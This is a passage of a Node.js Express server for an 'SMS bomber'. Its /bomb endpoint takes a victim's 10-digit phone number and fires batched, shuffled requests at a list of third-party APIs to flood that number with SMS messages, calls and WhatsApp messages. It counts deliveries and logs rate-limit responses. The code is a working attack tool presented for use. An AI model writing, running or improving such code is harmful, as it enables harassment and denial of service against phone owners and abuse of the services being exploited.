        api_delay_ms: API_DELAY_MS,
        uptime: process.uptime()
    });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    
    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
    }

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'}`);
    console.log(`🧪 Testing ${APIS.length} UNTESTED APIs...`);

    try {
        const startTime = Date.now();
        let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
        const apiList = APIS;
        const BATCH_SIZE = 5;
        
        let maxRequests = 100;
        if (effectiveDuration <= 1) maxRequests = 200;
        else if (effectiveDuration <= 5) maxRequests = 150;
        else if (effectiveDuration <= 10) maxRequests = 100;
        else maxRequests = 80;

        const shuffled = [...apiList];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }

        let sent = 0;
        for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
            const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
            
            const results = await Promise.allSettled(
                batch.map(api => makeApiCall(api, phone))
            );
            
            for (let k = 0; k < results.length; k++) {
                const result = results[k];
                const api = batch[k];
                
                if (result.status === 'fulfilled' && result.value && result.value.success) {
                    success++;
                    sent++;
                    const apiName = api.name || '';
                    const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                    const isWhatsapp = apiName.toLowerCase().includes('whatsapp');
                    const type = isCall ? 'CALL' : (isWhatsapp ? 'WA' : 'SMS');
                    
                    console.log(`  ✅ [${success}] ${apiName} → ${result.value.status} (${result.value.responseTime}ms) [${type}]`);
                    
                    if (isCall) callCount++;
                    else if (isWhatsapp) whatsappCount++;
                    else smsCount++;
                } else {
                    const apiName = api.name || '';
                    const status = result.value?.status || 'FAIL';
                    const responseTime = result.value?.responseTime || 0;
                    
                    if (status === 429) {
                        console.log(`  🚫 ${apiName} → 429 RATE_LIMITED (${responseTime}ms)`);
                    } else {
                        console.log(`  ❌ ${apiName} → ${status} (${responseTime}ms)`);
                    }
                }
            }
            
            if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
                await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
            }
        }

        const elapsed = (Date.now() - startTime) / 1000;
        
        console.log(`✅ Bombing ${phone} done | Sent: ${success} | SMS: ${smsCount} | Calls: ${callCount} | WA: ${whatsappCount} | ${elapsed.toFixed(1)}s\n`);
        
        res.json({
            success: true,
            phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: success,
            sms: smsCount,
            calls: callCount,
            whatsapp: whatsappCount,
            elapsed: elapsed.toFixed(1) + 's',
            total_apis: APIS.length,
            mode: 'UNTESTED'
        });
        
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: APIS.length,
        mode: 'UNTESTED APIs ONLY',
        max_duration_min: MAX_DURATION_MIN,
        api_delay_ms: API_DELAY_MS,
        apis: APIS.map(a => a.name),
        instances: process.env.INSTANCE_NAME || 'api'
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 API Server running on port ${PORT}`);
    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    console.log(`📊 UNTESTED APIs Loaded: ${APIS.length}`);
    console.log(`⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
    console.log(`⏳ API delay: ${API_DELAY_MS}ms`);
    console.log(`⏳ Batch delay: ${BATCH_DELAY_MS}ms`);
    console.log(`🧪 Mode: UNTESTED APIs ONLY`);
});
